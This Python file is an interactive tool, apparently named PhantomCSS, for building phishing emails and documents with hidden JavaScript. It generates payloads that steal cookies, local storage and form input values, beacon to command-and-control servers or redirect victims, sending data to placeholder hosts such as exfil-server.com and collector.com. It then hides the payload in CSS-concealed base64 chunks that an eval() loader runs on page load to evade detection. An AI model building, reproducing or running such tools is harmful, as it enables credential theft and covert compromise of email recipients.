import base64
import random
import string
from abc import ABC, abstractmethod
from typing import List, Dict, Any
import html
import json
import time
from dataclasses import dataclass
from enum import Enum

class PayloadType(Enum):
    JS_REDIRECT = "js_redirect"
    DATA_EXFIL = "data_exfil"
    C2_BEACON = "c2_beacon"
    PERSISTENCE = "persistence"
    INFO_STEALER = "info_stealer"
    DOM_SCRAPER = "dom_scraper"

class DeliveryMethod(Enum):
    EMAIL_HTML = "email_html"
    DOCUMENT_EMBED = "document_embed"
    ATTACHMENT_HTML = "attachment_html"

@dataclass
class Payload:
    name: str
    payload_type: PayloadType
    javascript: str
    description: str
    css_technique: str = ""

class CSSTextTechnique(ABC):
    """Base class for CSS text manipulation techniques"""
    
    @abstractmethod
    def encode(self, text: str) -> Dict[str, Any]:
        pass
    
    @abstractmethod
    def decode(self, encoded_data: Dict[str, Any]) -> str:
        pass
    
    @abstractmethod
    def get_css(self) -> str:
        pass

class DisplayNoneTechnique(CSSTextTechnique):
    def encode(self, text: str) -> Dict[str, Any]:
        class_name = f"hidden-{random.randint(1000, 9999)}"
        return {
            'technique': 'display_none',
            'css': f".{class_name}",
            'html': f'<span class="{class_name}">{html.escape(text)}</span>',
            'class_name': class_name
        }
    
    def decode(self, encoded_data: Dict[str, Any]) -> str:
        return encoded_data['html'].split('>')[1].split('<')[0]
    
    def get_css(self) -> str:
        return "display: none !important;"

class VisibilityHiddenTechnique(CSSTextTechnique):
    def encode(self, text: str) -> Dict[str, Any]:
        class_name = f"vis-hidden-{random.randint(1000, 9999)}"
        return {
            'technique': 'visibility_hidden', 
            'css': f".{class_name}",
            'html': f'<div class="{class_name}">{html.escape(text)}</div>',
            'class_name': class_name
        }
    
    def decode(self, encoded_data: Dict[str, Any]) -> str:
        return encoded_data['html'].split('>')[1].split('<')[0]
    
    def get_css(self) -> str:
        return "visibility: hidden !important;"

class TextIndentTechnique(CSSTextTechnique):
    def encode(self, text: str) -> Dict[str, Any]:
        class_name = f"indent-{random.randint(1000, 9999)}"
        return {
            'technique': 'text_indent',
            'css': f".{class_name}",
            'html': f'<span class="{class_name}">{html.escape(text)}</span>',
            'class_name': class_name
        }
    
    def decode(self, encoded_data: Dict[str, Any]) -> str:
        return encoded_data['html'].split('>')[1].split('<')[0]
    
    def get_css(self) -> str:
        return "text-indent: -9999px; overflow: hidden;"

class OpacityZeroTechnique(CSSTextTechnique):
    def encode(self, text: str) -> Dict[str, Any]:
        class_name = f"opacity-{random.randint(1000, 9999)}"
        return {
            'technique': 'opacity_zero',
            'css': f".{class_name}",
            'html': f'<span class="{class_name}">{html.escape(text)}</span>',
            'class_name': class_name
        }
    
    def decode(self, encoded_data: Dict[str, Any]) -> str:
        return encoded_data['html'].split('>')[1].split('<')[0]
    
    def get_css(self) -> str:
        return "opacity: 0 !important; filter: alpha(opacity=0);"

class FontSizeZeroTechnique(CSSTextTechnique):
    def encode(self, text: str) -> Dict[str, Any]:
        class_name = f"fs-zero-{random.randint(1000, 9999)}"
        return {
            'technique': 'font_size_zero',
            'css': f".{class_name}",
            'html': f'<span class="{class_name}">{html.escape(text)}</span>',
            'class_name': class_name
        }
    
    def decode(self, encoded_data: Dict[str, Any]) -> str:
        return encoded_data['html'].split('>')[1].split('<')[0]
    
    def get_css(self) -> str:
        return "font-size: 0px !important; line-height: 0;"

class ZeroWidthSpaceTechnique(CSSTextTechnique):
    def encode(self, text: str) -> Dict[str, Any]:
        class_name = f"zw-{random.randint(1000, 9999)}"
        # Use zero-width spaces between characters
        encoded_text = '&#8203;'.join(text)
        return {
            'technique': 'zero_width_space',
            'css': f".{class_name}",
            'html': f'<span class="{class_name}">{encoded_text}</span>',
            'class_name': class_name
        }
    
    def decode(self, encoded_data: Dict[str, Any]) -> str:
        html_content = encoded_data['html'].split('>')[1].split('<')[0]
        return html_content.replace('&#8203;', '')
    
    def get_css(self) -> str:
        return "width: 0; height: 0; overflow: hidden; position: absolute;"

class PhantomCSS:
    """Interactive CSS Text Salting for Payload Delivery"""
    
    def __init__(self):
        self.techniques = {
            'display_none': DisplayNoneTechnique(),
            'visibility_hidden': VisibilityHiddenTechnique(),
            'text_indent': TextIndentTechnique(),
            'opacity_zero': OpacityZeroTechnique(),
            'font_size_zero': FontSizeZeroTechnique(),
            'zero_width': ZeroWidthSpaceTechnique()
        }
        self.payloads = []
        self.generated_deliveries = []
        
    def interactive_menu(self):
        """Main interactive menu"""
        print(self._get_banner())
        
        while True:
            print("\n" + "="*50)
            print(" PHANTOMCSS - CSS Text Salting Framework")
            print("="*50)
            print("1.  Create JavaScript Payload")
            print("2.  Generate Salted Email/Document")
            print("3.   Preview Detection Evasion")
            print("4.  Save Payload")
            print("5.  Load Payload")
            print("6.   Show Created Payloads")
            print("7.  Test Delivery Methods")
            print("0.  Exit")
            
            choice = input("\n Choose an option: ").strip()
            
            if choice == "1":
                self._create_js_payload()
            elif choice == "2":
                self._generate_salted_delivery()
            elif choice == "3":
                self._preview_evasion()
            elif choice == "4":
                self._save_payload()
            elif choice == "5":
                self._load_payload()
            elif choice == "6":
                self._show_payloads()
            elif choice == "7":
                self._test_delivery()
            elif choice == "0":
                print(" Until next time, phantom...")
                break
            else:
                print(" Invalid choice. Please try again.")

    def _create_js_payload(self):
        """Interactive JavaScript payload creation"""
        print("\n Create JavaScript Payload")
        print("-" * 30)
        
        print("\nAvailable Payload Types:")
        print("1. JS Redirect - Redirect to malicious site")
        print("2. Data Exfiltration - Steal cookies/form data")
        print("3. C2 Beacon - Callback to command & control")
        print("4. Persistence - Establish foothold")
        print("5. Info Stealer - Collect browser/system info")
        print("6. DOM Scraper - Extract page content")
        
        ptype_choice = input("\nSelect payload type (1-6): ").strip()
        
        payload_types = {
            '1': PayloadType.JS_REDIRECT,
            '2': PayloadType.DATA_EXFIL,
            '3': PayloadType.C2_BEACON,
            '4': PayloadType.PERSISTENCE,
            '5': PayloadType.INFO_STEALER,
            '6': PayloadType.DOM_SCRAPER
        }
        
        if ptype_choice not in payload_types:
            print("❌ Invalid choice. Using JS Redirect.")
            payload_type = PayloadType.JS_REDIRECT
        else:
            payload_type = payload_types[ptype_choice]
        
        name = input("Payload name: ").strip() or f"payload_{random.randint(1000,9999)}"
        
        # Generate appropriate JavaScript based on type
        js_code = self._generate_javascript_payload(payload_type)
        
        payload = Payload(
            name=name,
            payload_type=payload_type,
            javascript=js_code,
            description=f"{payload_type.value} payload"
        )
        
        self.payloads.append(payload)
        print(f"\n Payload '{name}' created!")
        print(f" JavaScript Length: {len(js_code)} characters")
        print(f" Type: {payload_type.value}")

    def _generate_javascript_payload(self, payload_type: PayloadType) -> str:
        """Generate JavaScript code based on payload type"""
        if payload_type == PayloadType.JS_REDIRECT:
            target_url = input("Redirect URL: ").strip() or "https://malicious.com/stealer.js"
            delay = input("Delay (ms) [1000]: ").strip() or "1000"
            return f"""
            setTimeout(function() {{
                window.location.href = "{target_url}";
                document.body.innerHTML = '<h1>Loading...</h1>';
            }}, {delay});
            """
        
        elif payload_type == PayloadType.DATA_EXFIL:
            exfil_url = input("Exfiltration server URL: ").strip() or "https://exfil-server.com/data"
            return f"""
            (function() {{
                var data = {{
                    cookies: document.cookie,
                    userAgent: navigator.userAgent,
                    url: window.location.href,
                    forms: Array.from(document.forms).map(f => f.action),
                    links: Array.from(document.links).map(l => l.href)
                }};
                var img = new Image();
                img.src = '{exfil_url}?data=' + btoa(JSON.stringify(data));
                console.log('Data exfiltrated');
            }})();
            """
        
        elif payload_type == PayloadType.C2_BEACON:
            c2_url = input("C2 Server URL: ").strip() or "https://c2-server.com/beacon"
            interval = input("Beacon interval (s) [30]: ").strip() or "30"
            return f"""
            function beacon() {{
                fetch('{c2_url}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        agent: navigator.userAgent,
                        cookies: document.cookie,
                        time: new Date().toISOString()
                    }})
                }});
            }}
            setInterval(beacon, {interval}000);
            beacon();
            """
        
        elif payload_type == PayloadType.INFO_STEALER:
            return """
            (function() {
                var info = {
                    platform: navigator.platform,
                    language: navigator.language,
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    screen: window.screen.width + 'x' + window.screen.height,
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                // Send to multiple fallback methods
                var data = btoa(JSON.stringify(info));
                new Image().src = 'https://collector.com?d=' + data;
                fetch('https://backup.com/collect', {method: 'POST', body: JSON.stringify(info)});
            })();
            """
        
        else:  # Default DOM scraper
            return """
            (function() {
                var content = {
                    title: document.title,
                    text: document.body.innerText.substring(0, 1000),
                    forms: Array.from(document.forms).map(f => ({
                        action: f.action,
                        inputs: Array.from(f.elements).map(i => i.name)
                    })),
                    inputs: Array.from(document.querySelectorAll('input')).map(i => ({
                        name: i.name,
                        type: i.type,
                        value: i.value
                    }))
                };
                // Exfiltrate
                var img = new Image();
                img.src = 'https://scrape.com?data=' + btoa(JSON.stringify(content));
            })();
            """

    def _generate_salted_delivery(self):
        """Generate CSS-salted email/document with hidden payload"""
        if not self.payloads:
            print("❌ No payloads created! Create a payload first.")
            return
            
        print("\n Generate Salted Email/Document")
        print("-" * 30)
        
        # Select payload
        print("\nAvailable Payloads:")
        for i, payload in enumerate(self.payloads):
            print(f"{i+1}. {payload.name} ({payload.payload_type.value})")
        
        try:
            choice = int(input("\nSelect payload: ").strip()) - 1
            selected_payload = self.payloads[choice]
        except:
            print("❌ Invalid selection. Using first payload.")
            selected_payload = self.payloads[0]
        
        # Select CSS technique
        print("\nAvailable CSS Techniques:")
        techniques = list(self.techniques.keys())
        for i, tech in enumerate(techniques):
            tech_name = tech.replace('_', ' ').title()
            print(f"{i+1}. {tech_name}")
        
        try:
            tech_choice = int(input("\nSelect technique: ").strip()) - 1
            selected_technique = techniques[tech_choice]
        except:
            print("❌ Invalid selection. Using display_none.")
            selected_technique = 'display_none'
        
        # Get delivery content
        print("\n Delivery Content:")
        subject = input("Email subject: ").strip() or "Important Update"
        visible_text = input("Visible email body: ").strip() or "Please review the attached document for important security updates."
        
        # Generate the salted content
        salted_content = self._create_salted_content(
            selected_payload, 
            selected_technique, 
            subject, 
            visible_text
        )
        
        # Save delivery
        timestamp = int(time.time())
        filename = f"phantom_delivery_{timestamp}.html"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(salted_content)
        
        self.generated_deliveries.append({
            'filename': filename,
            'payload': selected_payload.name,
            'technique': selected_technique,
            'timestamp': timestamp
        })
        
        print(f"\n Salted delivery generated: {filename}")
        print(f" Payload: {selected_payload.name}")
        print(f" CSS Technique: {selected_technique}")
        print(f" Subject: {subject}")
        print(f" Visible text length: {len(visible_text)} chars")
        print(f" Hidden payload length: {len(selected_payload.javascript)} chars")

    def _create_salted_content(self, payload: Payload, technique: str, subject: str, visible_text: str) -> str:
        """Create CSS-salted content with hidden payload"""
        tech_obj = self.techniques[technique]
        
        # Encode the JavaScript payload
        encoded_js = base64.b64encode(payload.javascript.encode()).decode()
        
        # Create multiple salted elements with the payload
        salted_elements = []
        css_rules = []
        
        # Split payload into chunks and salt them throughout the document
        chunk_size = 50
        chunks = [encoded_js[i:i+chunk_size] for i in range(0, len(encoded_js), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            encoded_chunk = tech_obj.encode(chunk)
            css_rules.append(f"{encoded_chunk['css']} {{ {tech_obj.get_css()} }}")
            
            # Add random visible text around the hidden content
            random_text = ''.join(random.choices(string.ascii_letters + ' ', k=random.randint(10, 30)))
            salted_elements.append(f"{random_text}{encoded_chunk['html']}{random_text}")
        
        # Combine everything
        css_content = "\n".join(css_rules)
        salted_html = "\n".join(salted_elements)
        
        # Create the full email/document HTML
        full_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{subject}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .visible-content {{ color: #333; line-height: 1.5; }}
        {css_content}
    </style>
</head>
<body>
    <h1>{subject}</h1>
    <div class="visible-content">
        {visible_text}
    </div>
    <div class="additional-content">
        {salted_html}
    </div>
    <script>
        // Payload recovery and execution
        window.addEventListener('load', function() {{
            var hiddenElements = document.querySelectorAll('[class]');
            var recoveredPayload = '';
            
            hiddenElements.forEach(function(el) {{
                var styles = window.getComputedStyle(el);
                if (styles.display === 'none' || 
                    styles.visibility === 'hidden' || 
                    styles.opacity === '0' ||
                    styles.fontSize === '0px' ||
                    styles.textIndent === '-9999px') {{
                    recoveredPayload += el.textContent;
                }}
            }});
            
            try {{
                var decodedJS = atob(recoveredPayload);
                eval(decodedJS);
                console.log('Payload executed successfully');
            }} catch(e) {{
                console.log('Payload execution failed:', e);
            }}
        }});
    </script>
</body>
</html>"""
        
        return full_content

    def _preview_evasion(self):
        """Show how the evasion works"""
        print("\n  CSS Evasion Techniques Preview")
        print("-" * 30)
        
        test_payload = "alert('This would be your malicious JavaScript');"
        encoded_payload = base64.b64encode(test_payload.encode()).decode()
        
        print("\n How CSS Text Salting Evades Detection:")
        print("1. Payload split into chunks and hidden using CSS")
        print("2. Each chunk surrounded by random visible text")
        print("3. Multiple CSS techniques make detection harder")
        print("4. JavaScript auto-recovers and executes on load")
        
        print(f"\n Example:")
        print(f"Original payload: {len(test_payload)} chars")
        print(f"Base64 encoded: {len(encoded_payload)} chars")
        print(f"Split into chunks and hidden with CSS")
        
        print("\n Available CSS Techniques:")
        for name, tech in self.techniques.items():
            example = tech.encode("hidden_text")
            print(f"  • {name}: {tech.get_css()}")

    def _save_payload(self):
        """Save current payloads"""
        if not self.payloads:
            print("❌ No payloads to save!")
            return
            
        filename = input("Save as filename [payloads.json]: ").strip() or "payloads.json"
        
        payload_data = []
        for payload in self.payloads:
            payload_data.append({
                'name': payload.name,
                'type': payload.payload_type.value,
                'javascript': payload.javascript,
                'description': payload.description
            })
        
        with open(filename, 'w') as f:
            json.dump(payload_data, f, indent=2)
            
        print(f" Payloads saved to {filename}")

    def _load_payload(self):
        """Load payloads from file"""
        filename = input("Load from filename [payloads.json]: ").strip() or "payloads.json"
        
        try:
            with open(filename, 'r') as f:
                payload_data = json.load(f)
            
            self.payloads = []
            for data in payload_data:
                payload = Payload(
                    name=data['name'],
                    payload_type=PayloadType(data['type']),
                    javascript=data['javascript'],
                    description=data['description']
                )
                self.payloads.append(payload)
            
            print(f" Loaded {len(self.payloads)} payloads from {filename}")
        except Exception as e:
            print(f"❌ Error loading payloads: {e}")

    def _show_payloads(self):
        """Show created payloads"""
        print("\n  Created Payloads")
        print("-" * 30)
        
        if not self.payloads:
            print("No payloads created yet.")
            return
            
        for i, payload in enumerate(self.payloads):
            print(f"{i+1}. {payload.name}")
            print(f"   Type: {payload.payload_type.value}")
            print(f"   Description: {payload.description}")
            print(f"   JS Length: {len(payload.javascript)} chars")
            print()

    def _test_delivery(self):
        """Test different delivery methods"""
        print("\n Test Delivery Methods")
        print("-" * 30)
        
        print("1.  Email HTML Body")
        print("2.  Document Embed")
        print("3.  HTML Attachment")
        
        choice = input("\nSelect delivery method: ").strip()
        
        methods = {
            '1': DeliveryMethod.EMAIL_HTML,
            '2': DeliveryMethod.DOCUMENT_EMBED, 
            '3': DeliveryMethod.ATTACHMENT_HTML
        }
        
        if choice in methods:
            method = methods[choice]
            print(f"\n {method.value} ready for testing")
            print(" Tip: Use email clients or document viewers that render HTML/JS")
        else:
            print("❌ Invalid selection")

    def _get_banner(self):
        return r"""
    ▄████████    ▄████████  ▄█           ███     ▄██   ▄   
  ███    ███   ███    ███ ███       ▀█████████▄ ███   ██▄ 
  ███    █▀    ███    ███ ███          ▀███▀▀██ ███▄▄▄███ 
  ███          ███    ███ ███           ███   ▀ ▀▀▀▀▀▀███ 
▀███████████ ▀███████████ ███           ███     ▄██   ███ 
         ███   ███    ███ ███           ███     ███   ███ 
   ▄█    ███   ███    ███ ███▌    ▄     ███     ███   ███ 
 ▄████████▀    ███    █▀  █████▄▄██    ▄████▀    ▀█████▀  
        """

def main():
    framework = PhantomCSS()
    framework.interactive_menu()

if __name__ == "__main__":
    main()
